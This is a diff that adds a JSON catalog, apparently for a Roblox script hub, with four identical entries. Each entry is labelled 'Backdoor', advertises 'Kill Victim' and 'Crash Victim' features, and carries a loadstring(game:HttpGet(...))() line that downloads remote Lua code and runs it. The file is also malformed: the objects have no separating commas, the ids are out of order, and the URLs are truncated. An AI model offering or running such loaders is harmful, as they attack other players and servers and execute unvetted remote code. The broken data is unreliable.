@@ -1,0 +1,44 @@
+{
+  "data": [
+      {
+          "id": 1,
+          "autor": "Ramirez",
+          "funcion": "Backdoor",
+          "juego": "Universal",
+          "features":  "<ul><li>Kill Victim</li><li>Crash Victim</li></ul>",
+          "descarga": "https://pastebin.com/raw/",
+          "txt":  "loadstring(game:HttpGet('https://raw.githubusercontent.com/dd.lua'))()",
+          "mini": "https://cdn.discordapp.com/attachments/882941526068564028/957870253034053632/unknown.png"
+      }
+      {
+          "id": 2,
+          "autor": "Ramirez",
+          "funcion": "Backdoor",
+          "juego": "Universal",
+          "features":  "<ul><li>Kill Victim</li><li>Crash Victim</li></ul>",
+          "descarga": "https://pastebin.com/raw/",
+          "txt":  "loadstring(game:HttpGet('https://raw.githubusercontent.com/dd.lua'))()",
+          "mini": "https://cdn.discordapp.com/attachments/882941526068564028/957870253034053632/unknown.png"
+      }
+      {
+          "id": 4,
+          "autor": "Ramirez",
+          "funcion": "Backdoor",
+          "juego": "Universal",
+          "features":  "<ul><li>Kill Victim</li><li>Crash Victim</li></ul>",
+          "descarga": "https://pastebin.com/raw/",
+          "txt":  "loadstring(game:HttpGet('https://raw.githubusercontent.com/dd.lua'))()",
+          "mini": "https://cdn.discordapp.com/attachments/882941526068564028/957870253034053632/unknown.png"
+      }
+      {
+          "id": 3,
+          "autor": "Ramirez",
+          "funcion": "Backdoor",
+          "juego": "Universal",
+          "features":  "<ul><li>Kill Victim</li><li>Crash Victim</li></ul>",
+          "descarga": "https://pastebin.com/raw/",
+          "txt":  "loadstring(game:HttpGet('https://raw.githubusercontent.com/dd.lua'))()",
+          "mini": "https://cdn.discordapp.com/attachments/882941526068564028/957870253034053632/unknown.png"
+      }
+  ]
+}
